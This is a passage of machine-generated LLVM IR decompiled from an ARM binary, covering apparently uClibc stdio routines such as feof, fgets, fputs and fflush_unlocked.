  store i32 %v1_10f84, i32* @r0, align 4
  %v2_10f88 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10f88, i32* @r1, align 4
  %v0_10f8c = call i32 @memcpy()
  store i32 %v0_10f8c, i32* %r0.global-to-local, align 4
  %v0_10f90.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10f90

dec_label_pc_10f90:                               ; preds = %dec_label_pc_10f60, %dec_label_pc_10f78
  %v2_10fac = phi i32 [ %v0_10f90.pre, %dec_label_pc_10f78 ], [ %v0_10f60, %dec_label_pc_10f60 ]
  %v1_10f90 = add i32 %v2_10fac, 16
  %v2_10f90 = inttoptr i32 %v1_10f90 to i32*
  %v3_10f90 = load i32, i32* %v2_10f90, align 4
  store i32 %v3_10f90, i32* %r3.global-to-local, align 4
  %v1_10f94 = and i32 %v3_10f90, 128
  %v2_10f94 = icmp eq i32 %v1_10f94, 0
  br i1 %v2_10f94, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_10f90
  store i32 %v2_10b38, i32* %r3.global-to-local, align 4
  %v2_10f9c = inttoptr i32 %v2_10fac to i32*
  %v3_10f9c = load i32, i32* %v2_10f9c, align 4
  %v2_10fa4.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_10fa4 = sub i32 %v2_10fa4.pre, %v2_10b38
  store i32 %v3_10fa4, i32* %r3.global-to-local, align 4
  %v5_10fa8 = mul i32 %v3_10fa4, 4
  %v6_10fa8 = add i32 %v5_10fa8, %v3_10f9c
  store i32 %v6_10fa8, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_10f90
  %v1_10fa041 = load i32, i32* %r6.global-to-local, align 4
  %v2_10fa042 = add i32 %v1_10fa041, 1
  store i32 %v2_10fa042, i32* %r3.global-to-local, align 4
  %v3_10fac = inttoptr i32 %v2_10fac to i32*
  store i32 %v2_10fa042, i32* %v3_10fac, align 4
  %v0_10fb0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_10fb8 = phi i32 [ %v2_10fac, %.thread44 ], [ %v0_10fb0.pre, %.thread46 ]
  %v1_10fb0 = add i32 %v1_10fb8, 28
  %v2_10fb0 = inttoptr i32 %v1_10fb0 to i32*
  %v3_10fb0 = load i32, i32* %v2_10fb0, align 4
  store i32 %v3_10fb0, i32* %r3.global-to-local, align 4
  %v1_10fb4 = add i32 %v3_10fb0, 2
  store i32 %v1_10fb4, i32* %r0.global-to-local, align 4
  %v0_10fb8 = load i32, i32* %sb.global-to-local, align 4
  %v2_10fb8 = add i32 %v1_10fb8, 24
  %v3_10fb8 = inttoptr i32 %v2_10fb8 to i32*
  store i32 %v0_10fb8, i32* %v3_10fb8, align 4
  br i1 %v2_10f94, label %dec_label_pc_10fc8, label %bb147

bb147:                                            ; preds = %bb146
  %v1_10fbc = load i32, i32* @r2, align 4
  %v2_10fbc = load i32, i32* %r7.global-to-local, align 4
  %v3_10fbc = inttoptr i32 %v2_10fbc to i32*
  store i32 %v1_10fbc, i32* %v3_10fbc, align 4
  br label %dec_label_pc_10fc8

dec_label_pc_10fc4:                               ; preds = %dec_label_pc_10b80, %dec_label_pc_10c8c, %dec_label_pc_10d3c, %dec_label_pc_10d10, %dec_label_pc_10d1c, %dec_label_pc_10c5c, %dec_label_pc_10efc, %dec_label_pc_10ea8, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10fc8

dec_label_pc_10fc8:                               ; preds = %bb147, %bb146, %dec_label_pc_10fc4
  %v2_10fcc = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10fcc, i32* @r4, align 4
  store i32 %v6_10b30, i32* @r5, align 4
  %v26_10fcc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_10fcc

; uselistorder directives
  uselistorder i32 %v3_10fa4, { 1, 0 }
  uselistorder i32 %v1_10f64, { 1, 2, 0 }
  uselistorder i32 %v0_10f18, { 1, 2, 0 }
  uselistorder i32 %v2_10ef4, { 1, 0 }
  uselistorder i32 %v1_10ef4, { 1, 0, 2 }
  uselistorder i32 %v0_10f14, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_10e58, { 1, 2, 0 }
  uselistorder i32 %v3_10e40, { 1, 0 }
  uselistorder i32 %v3_10e38, { 1, 0 }
  uselistorder i32 %v2_10e18, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10e00, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10de4, { 1, 0, 2 }
  uselistorder i32 %v3_10dc4, { 2, 1, 0 }
  uselistorder i32 %v1_10d88, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10d5c, { 1, 0 }
  uselistorder i32 %v5_10cbc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10cbc, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_10c68, { 1, 0 }
  uselistorder i32 %v0_10c84, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_10c4c, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10c34, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_10c20, { 1, 2, 0 }
  uselistorder i32 %v0_10c98, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10bd4, { 1, 0 }
  uselistorder i32 %v1_10ba4, { 0, 2, 1 }
  uselistorder i32 %v25_10b30, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 17, 3, 7, 4, 1, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18 }
  uselistorder i32* %r6.global-to-local, { 14, 12, 10, 9, 0, 2, 11, 3, 4, 5, 7, 13, 15, 6, 1, 8 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 6, 5, 7, 8, 9, 10, 11, 12, 23, 22, 13, 25, 14, 15, 16, 26, 17, 27, 18, 28, 19, 20, 21, 24, 0 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1932c.375 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1933c.373 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_19358.367 to i32), { 2, 1, 3, 0 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_19318.365 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_10fc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10fc4, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_10f90, { 1, 0 }
  uselistorder label %dec_label_pc_10f60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f4c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10f08, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_10ec0, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10d74, { 1, 0 }
  uselistorder label %dec_label_pc_10d4c, { 1, 0 }
  uselistorder label %dec_label_pc_10cfc, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10c7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c78, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10bd8, { 1, 0 }
  uselistorder label %dec_label_pc_10bc8, { 1, 0 }
}

define i32 @feof(i8* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10ff4 = load i32, i32* @r4, align 4
  store i32 %v3_10ff4, i32* %stack_var_-16, align 4
  %v2_10ff8 = add i32 %tmp, 52
  %v3_10ff8 = inttoptr i32 %v2_10ff8 to i32*
  %v4_10ff8 = load i32, i32* %v3_10ff8, align 4
  store i32 %v4_10ff8, i32* %r6.global-to-local, align 4
  %v2_11000 = ptrtoint i32* %stack_var_-32 to i32
  %v2_11004 = icmp eq i32 %v4_10ff8, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_11000, i32* @r0, align 4
  br i1 %v2_11004, label %dec_label_pc_1101c, label %dec_label_pc_11038

dec_label_pc_1101c:                               ; preds = %entry
  %v1_11024 = call i32 @__pthread_return_void()
  %v1_11034 = call i32 @__pthread_return_0()
  %v0_11038.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_11040.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11038

dec_label_pc_11038:                               ; preds = %entry, %dec_label_pc_1101c
  %v0_11040 = phi i32 [ %v4_10ff8, %entry ], [ %v0_11040.pre, %dec_label_pc_1101c ]
  %v0_11038 = phi i32 [ %tmp, %entry ], [ %v0_11038.pre, %dec_label_pc_1101c ]
  %v1_11038 = add i32 %v0_11038, 1
  %v2_11038 = inttoptr i32 %v1_11038 to i8*
  %v3_11038 = load i8, i8* %v2_11038, align 1
  %v4_11038 = zext i8 %v3_11038 to i32
  %v1_1103c = inttoptr i32 %v0_11038 to i8*
  %v2_1103c = load i8, i8* %v1_1103c, align 1
  %v3_1103c = zext i8 %v2_1103c to i32
  %v2_11040 = icmp eq i32 %v0_11040, 0
  %v4_1104c = mul nuw nsw i32 %v4_11038, 256
  %v5_1104c = or i32 %v3_1103c, %v4_1104c
  store i32 %v5_1104c, i32* %r4.global-to-local, align 4
  br i1 %v2_11040, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11038
  call void @__pseudo_branch(i32 79548)
  %v0_1105c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11038, %bb
  %v0_1105c = phi i32 [ %v5_1104c, %dec_label_pc_11038 ], [ %v0_1105c.pre, %bb ]
  %v1_1105c = and i32 %v0_1105c, 4
  %v2_11064 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11064, i32* @r4, align 4
  ret i32 %v1_1105c

; uselistorder directives
  uselistorder i32 %v0_11038, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_11038, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11078 = load i32, i32* @r4, align 4
  store i32 %v3_11078, i32* %stack_var_-24, align 4
  %v6_11078 = load i32, i32* @r5, align 4
  %v9_11078 = load i32, i32* @r6, align 4
  %v12_11078 = load i32, i32* @r7, align 4
  %v1_1107c = add i32 %arg3, 52
  %v2_1107c = inttoptr i32 %v1_1107c to i32*
  %v3_1107c = load i32, i32* %v2_1107c, align 4
  store i32 %v3_1107c, i32* %r8.global-to-local, align 4
  %v2_11080 = ptrtoint i32* %stack_var_-40 to i32
  %v1_11084 = add i32 %arg3, 56
  store i32 %v1_11084, i32* @r5, align 4
  %v2_11088 = icmp eq i32 %v3_1107c, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_11080, i32* @r0, align 4
  br i1 %v2_11088, label %dec_label_pc_110a8, label %dec_label_pc_110c4

dec_label_pc_110a8:                               ; preds = %entry
  %v1_110b0 = call i32 @__pthread_return_void()
  store i32 69828, i32* @lr, align 4
  %v1_110c0 = call i32 @__pthread_return_0()
  %v0_110c4.pre = load i32, i32* @r6, align 4
  %v0_110c8.pre = load i32, i32* @r4, align 4
  %v0_110cc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_110c4

dec_label_pc_110c4:                               ; preds = %entry, %dec_label_pc_110a8
  %v0_110cc = phi i32 [ %arg1, %entry ], [ %v0_110cc.pre, %dec_label_pc_110a8 ]
  %v0_110c8 = phi i32 [ %arg3, %entry ], [ %v0_110c8.pre, %dec_label_pc_110a8 ]
  %v0_110c4 = phi i32 [ %arg2, %entry ], [ %v0_110c4.pre, %dec_label_pc_110a8 ]
  %v3_110d0 = inttoptr i32 %v0_110cc to i8*
  %v4_110d0 = call i32 @__GI_fgets_unlocked(i8* %v3_110d0, i32 %v0_110c4, i32 %v0_110c8)
  %v0_110d4 = load i32, i32* %r8.global-to-local, align 4
  %v2_110d4 = icmp eq i32 %v0_110d4, 0
  store i32 %v4_110d0, i32* %r4.global-to-local, align 4
  br i1 %v2_110d4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_110c4
  store i32 69872, i32* @lr, align 4
  call void @__pseudo_branch(i32 79548)
  %v0_110f0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_110c4, %bb
  %v0_110f0 = phi i32 [ %v4_110d0, %dec_label_pc_110c4 ], [ %v0_110f0.pre, %bb ]
  %v2_110f8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_110f8, i32* @r4, align 4
  store i32 %v6_11078, i32* @r5, align 4
  store i32 %v9_11078, i32* @r6, align 4
  store i32 %v12_11078, i32* @r7, align 4
  ret i32 %v0_110f0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_110c4, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1110c = load i32, i32* @r4, align 4
  store i32 %v3_1110c, i32* %stack_var_-20, align 4
  %v6_1110c = load i32, i32* @r5, align 4
  %v9_1110c = load i32, i32* @r6, align 4
  %v12_1110c = load i32, i32* @r7, align 4
  %v1_11110 = add i32 %arg2, 52
  %v2_11110 = inttoptr i32 %v1_11110 to i32*
  %v3_11110 = load i32, i32* %v2_11110, align 4
  store i32 %v3_11110, i32* @r7, align 4
  %v1_11114 = add i32 %arg2, 56
  store i32 %v1_11114, i32* @r5, align 4
  %v2_11118 = ptrtoint i32* %stack_var_-36 to i32
  %v2_1111c = icmp eq i32 %v3_11110, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_11118, i32* @r0, align 4
  br i1 %v2_1111c, label %dec_label_pc_11138, label %dec_label_pc_11154

dec_label_pc_11138:                               ; preds = %entry
  %v1_11140 = call i32 @__pthread_return_void()
  store i32 69972, i32* @lr, align 4
  %v1_11150 = call i32 @__pthread_return_0()
  %v0_11154.pre = load i32, i32* @r4, align 4
  %v0_11158.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11154

dec_label_pc_11154:                               ; preds = %entry, %dec_label_pc_11138
  %v0_11158 = phi i32 [ %arg1, %entry ], [ %v0_11158.pre, %dec_label_pc_11138 ]
  %v0_11154 = phi i32 [ %arg2, %entry ], [ %v0_11154.pre, %dec_label_pc_11138 ]
  %v2_1115c = inttoptr i32 %v0_11158 to i8*
  %v3_1115c = call i32 @__GI_fputs_unlocked(i8* %v2_1115c, i32 %v0_11154)
  %v0_11160 = load i32, i32* @r7, align 4
  %v2_11160 = icmp eq i32 %v0_11160, 0
  store i32 %v3_1115c, i32* %r4.global-to-local, align 4
  br i1 %v2_11160, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11154
  call void @__pseudo_branch(i32 79548)
  %v0_1117c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11154, %bb
  %v0_1117c = phi i32 [ %v3_1115c, %dec_label_pc_11154 ], [ %v0_1117c.pre, %bb ]
  %v2_11184 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11184, i32* @r4, align 4
  store i32 %v6_1110c, i32* @r5, align 4
  store i32 %v9_1110c, i32* @r6, align 4
  store i32 %v12_1110c, i32* @r7, align 4
  ret i32 %v0_1117c

; uselistorder directives
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_11154, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_1119c = ptrtoint i32* %stack_var_-48 to i32
  %v2_111a0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_111a0, i32* @r0, align 4
  store i32 79548, i32* %r4.global-to-local, align 4
  %v1_111b4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r5.global-to-local, align 4
  %v1_111c4 = call i32 @__pthread_return_0()
  %v2_111cc = load i32, i32* @global_var_26888.311, align 4
  %v7_111d0 = icmp eq i32 %v2_111cc, 1
  br i1 %v7_111d0, label %dec_label_pc_111d8, label %dec_label_pc_11284

dec_label_pc_111d8:                               ; preds = %entry
  %v2_111dc = load i32, i32* @global_var_2688c.316, align 4
  %tmp19 = icmp slt i32 %v2_111dc, 1
  br i1 %tmp19, label %dec_label_pc_11284, label %dec_label_pc_111e8

dec_label_pc_111e8:                               ; preds = %dec_label_pc_111d8
  store i32 %v2_1119c, i32* @r0, align 4
  %v1_111f8 = call i32 @__pthread_return_void()
  %v1_11204 = call i32 @__pthread_return_0()
  %v2_1120c = load i32, i32* bitcast (i32** @global_var_22508.331 to i32*), align 4
  store i32 %v2_1120c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1125c3 = icmp eq i32 %v2_1120c, 0
  br i1 %v2_1125c3, label %dec_label_pc_11268, label %dec_label_pc_11218

dec_label_pc_11218:                               ; preds = %dec_label_pc_111e8, %dec_label_pc_11258
  %v1_11230 = phi i32 [ %v0_11258, %dec_label_pc_11258 ], [ %v2_1120c, %dec_label_pc_111e8 ]
  %v1_11218 = inttoptr i32 %v1_11230 to i8*
  %v2_11218 = load i8, i8* %v1_11218, align 1
  %v3_11218 = zext i8 %v2_11218 to i32
  %v1_1121c = add i32 %v1_11230, 1
  %v2_1121c = inttoptr i32 %v1_1121c to i8*
  %v3_1121c = load i8, i8* %v2_1121c, align 1
  %v4_1121c = zext i8 %v3_1121c to i32
  %v4_11220 = mul nuw nsw i32 %v4_1121c, 256
  %v5_11220 = or i32 %v4_11220, %v3_11218
  %v2_11224 = and i32 %v5_11220, 32816
  %v7_11228 = icmp eq i32 %v2_11224, 48
  %v1_1122c = add i32 %v1_11230, 32
  %v2_1122c = inttoptr i32 %v1_1122c to i32*
  %v3_1122c = load i32, i32* %v2_1122c, align 4
  store i32 %v3_1122c, i32* %r5.global-to-local, align 4
  br i1 %v7_11228, label %dec_label_pc_11238, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_11218
  store i32 %v1_11230, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11258

dec_label_pc_11238:                               ; preds = %dec_label_pc_11218
  %v0_11238 = load i32, i32* %r6.global-to-local, align 4
  %v2_11238 = icmp eq i32 %v0_11238, 0
  br i1 %v2_11238, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_11238
  %v3_11240 = add i32 %v0_11238, 32
  %v4_11240 = inttoptr i32 %v3_11240 to i32*
  store i32 %v3_1122c, i32* %v4_11240, align 4
  %v0_11248.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_11238
  store i32 %v3_1122c, i32* bitcast (i32** @global_var_22508.331 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_11248 = phi i32 [ %v0_11248.pre, %.thread ], [ %v1_11230, %.thread1 ]
  %v1_11248 = add i32 %v0_11248, 1
  %v2_11248 = inttoptr i32 %v1_11248 to i8*
  %v3_11248 = load i8, i8* %v2_11248, align 1
  %v1_1124c = and i8 %v3_11248, 32
  %v1_11254 = icmp ne i8 %v1_1124c, 0
  call void @__pseudo_cond_branch(i1 %v1_11254, i32 ptrtoint (i32* @global_var_126e8.313 to i32))
  %v0_11258.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11258

dec_label_pc_11258:                               ; preds = %.thread12, %bb
  %v0_11258 = phi i32 [ %v0_11258.pre, %bb ], [ %v3_1122c, %.thread12 ]
  store i32 %v0_11258, i32* %r4.global-to-local, align 4
  %v2_1125c = icmp eq i32 %v0_11258, 0
  br i1 %v2_1125c, label %dec_label_pc_11268, label %dec_label_pc_11218

dec_label_pc_11268:                               ; preds = %dec_label_pc_11258, %dec_label_pc_111e8
  store i32 %v2_1119c, i32* @r0, align 4
  %v1_11278 = call i32 @__pthread_return_void()
  %v0_11280 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11280, i32* @global_var_2688c.316, align 4
  %v2_11288.pre = load i32, i32* @global_var_26888.311, align 4
  br label %dec_label_pc_11284

dec_label_pc_11284:                               ; preds = %entry, %dec_label_pc_111d8, %dec_label_pc_11268
  %v2_11288 = phi i32 [ %v2_111cc, %entry ], [ 1, %dec_label_pc_111d8 ], [ %v2_11288.pre, %dec_label_pc_11268 ]
  %v1_1128c = add i32 %v2_11288, -1
  store i32 %v1_1128c, i32* @global_var_26888.311, align 4
  store i32 %v2_111a0, i32* @r0, align 4
  store i32 70312, i32* @lr, align 4
  %v1_112a4 = call i32 @__pthread_return_void()
  ret i32 %v1_112a4

; uselistorder directives
  uselistorder i32 %v0_11258, { 2, 1, 0 }
  uselistorder i32 %v3_1122c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11230, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* @global_var_2688c.316, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11284, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11258, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_11218, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_112d8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_22508.331 to i32), i32* %r3.global-to-local, align 4
  %v10_112e0 = icmp eq i8* %arg1, bitcast (i32** @global_var_22508.331 to i8*)
  store i1 %v10_112e0, i1* %cpsr_z.global-to-local, align 1
  %.v1_112e4 = select i1 %v10_112e0, i32 0, i32 %tmp
  store i32 %.v1_112e4, i32* %r8.global-to-local, align 4
  %v2_112ec = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_112e0, label %bb, label %dec_label_pc_112f8

bb:                                               ; preds = %entry
  store i32 %.v1_112e4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11304

dec_label_pc_112f8:                               ; preds = %entry
  %v2_112f8 = icmp eq i32 %.v1_112e4, 0
  store i1 %v2_112f8, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_112f8, label %dec_label_pc_11304, label %dec_label_pc_11450

dec_label_pc_11304:                               ; preds = %bb, %dec_label_pc_112f8
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_112ec, i32* @r0, align 4
  %v1_11318 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_22524.309 to i32), i32* %r0.global-to-local, align 4
  %v1_11328 = call i32 @__pthread_return_0()
  %v2_11330 = load i32, i32* @global_var_26888.311, align 4
  %v1_11334 = add i32 %v2_11330, 1
  store i32 %v1_11334, i32* %r3.global-to-local, align 4
  store i32 %v1_11334, i32* @global_var_26888.311, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_112ec, i32* @r0, align 4
  %v1_1134c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_112ec, i32* @r0, align 4
  %v1_11360 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2250c.328 to i32), i32* %r0.global-to-local, align 4
  %v1_1136c = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_22508.331 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_112ec, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1137c = load i32, i32* bitcast (i32** @global_var_22508.331 to i32*), align 4
  store i32 %v2_1137c, i32* @r6, align 4
  %v1_11384 = call i32 @__pthread_return_void()
  store i32 %v1_11384, i32* %r0.global-to-local, align 4
  store i32 %v2_112ec, i32* @r4, align 4
  %v0_1138c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1138c, i32* @r5, align 4
  %v0_11440.pr = load i32, i32* @r6, align 4
  %v2_1144025 = icmp eq i32 %v0_11440.pr, 0
  store i1 %v2_1144025, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1144025, label %dec_label_pc_11448, label %dec_label_pc_11394

dec_label_pc_11394:                               ; preds = %dec_label_pc_11304, %.thread11
  %v0_113b0 = phi i32 [ %v3_1143c, %.thread11 ], [ %v0_11440.pr, %dec_label_pc_11304 ]
  %v1_11394 = inttoptr i32 %v0_113b0 to i8*
  %v2_11394 = load i8, i8* %v1_11394, align 1
  %v3_11394 = zext i8 %v2_11394 to i32
  store i32 %v3_11394, i32* %r3.global-to-local, align 4
  %v1_11398 = and i32 %v3_11394, 64
  %v2_11398 = icmp eq i32 %v1_11398, 0
  store i1 %v2_11398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11398, label %.thread11, label %dec_label_pc_113a0

dec_label_pc_113a0:                               ; preds = %dec_label_pc_11394
  %v2_113a4 = load i32, i32* @global_var_2253c.322, align 4
  store i32 %v2_113a4, i32* %r3.global-to-local, align 4
  %v7_113a8 = icmp eq i32 %v2_113a4, 2
  store i1 %v7_113a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113a8, label %dec_label_pc_113dc, label %dec_label_pc_113b0

dec_label_pc_113b0:                               ; preds = %dec_label_pc_113a0
  %v1_113b0 = add i32 %v0_113b0, 56
  store i32 %v1_113b0, i32* @r4, align 4
  store i32 %v2_112ec, i32* @r0, align 4
  store i32 79548, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r1.global-to-local, align 4
  %v1_113c8 = call i32 @__pthread_return_void()
  %v0_113cc = load i32, i32* @r4, align 4
  store i32 %v0_113cc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r3.global-to-local, align 4
  %v1_113d8 = call i32 @__pthread_return_0()
  store i32 %v1_113d8, i32* %r0.global-to-local, align 4
  %v0_113dc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_113dc

dec_label_pc_113dc:                               ; preds = %dec_label_pc_113a0, %dec_label_pc_113b0
  %v0_113f0 = phi i32 [ %v0_113b0, %dec_label_pc_113a0 ], [ %v0_113dc.pre, %dec_label_pc_113b0 ]
  %v1_113dc = inttoptr i32 %v0_113f0 to i32*
  %v2_113dc = load i32, i32* %v1_113dc, align 4
  %v0_113e0 = load i32, i32* %sl.global-to-local, align 4
  %v2_113e0 = or i32 %v0_113e0, %v2_113dc
  %v1_113e4 = xor i32 %v2_113e0, 320
